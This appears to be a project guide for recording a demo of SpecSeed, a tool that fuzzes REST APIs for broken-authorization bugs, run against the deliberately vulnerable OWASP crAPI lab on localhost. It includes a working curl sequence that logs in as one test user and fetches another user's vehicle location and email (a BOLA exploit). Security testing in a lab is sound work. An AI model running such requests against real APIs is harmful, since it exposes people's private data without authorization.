# Recording the SpecSeed demo

The demo clip is the single most important marketing asset: it shows SpecSeed
finding a *real* OWASP bug, live, ending with the `curl` that reproduces it.
Everything (README, Show HN, blog) links back to it.

Target: a ~45–60 second clip. crAPI bring-up is slow (~2–3 min), so **pre-warm
it before recording** and start the recording at the fuzz step.

## Tools

- [`asciinema`](https://asciinema.org) for a terminal cast (`pip install asciinema`), or
- `asciinema` → [`agg`](https://github.com/asciinema/agg) to export a GIF for the README, or
- any screen recorder if you prefer an MP4.

## One-time setup (do NOT record this part)

```bash
pip install -r requirements.txt
mkdir -p ~/crapi && curl -fsSL \
  https://raw.githubusercontent.com/OWASP/crapi/develop/deploy/docker/docker-compose.yml \
  -o ~/crapi/docker-compose.yml

# pre-pull images and bring crAPI up so the recording isn't 3 minutes of pulls
python -c "from eval.apis import start; print(start('crapi'))"
# wait until it prints: UP http://localhost:8888
```

## The recording (this is the clip)

Keep it to three beats: the one-liner, the run, the reproduce.

```bash
# BEAT 1 — what it does (type this as a comment, or say it in voiceover)
#   SpecSeed: find broken-authorization bugs in a REST API, black-box.

# BEAT 2 — run it against OWASP crAPI; 200s of fuzzing, finds all 5 violations.
# Use scripts.demo, not eval.campaign: the campaign tears the target down at the
# end, which would break the live curl below. scripts.demo leaves it running.
python -m scripts.demo

# BEAT 3 — the output already lists each violation with its curl; reproduce one
```

Then run the printed `curl` for the vehicle-location BOLA to land the punchline —
a second user's GPS location and owner email coming back from a resource they
don't own:

```bash
BASE=http://localhost:8888
TOKEN=$(curl -s -X POST $BASE/identity/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"rl-primary@example.com","password":"RLeague123!"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
# a vehicle rl-primary does NOT own:
curl -s "$BASE/identity/api/v2/vehicle/<id-from-report>/location" -H "Authorization: Bearer $TOKEN"
# -> 200 {... "vehicleLocation": {...}, "email": "someone-else@example.com"}
```

## Trim / caption

- Cut the dead time while the fuzzer runs — jump from "running…" to the report.
- End on the `curl` output, frozen for a beat. That frame is the thumbnail.
- One caption overlay at the start ("finds BOLA/BFLA black-box, zero false positives") and one at the end ("reproduce with the curl it gives you").

## Cleanup

```bash
python -c "from eval.apis import stop; stop('crapi')"
```
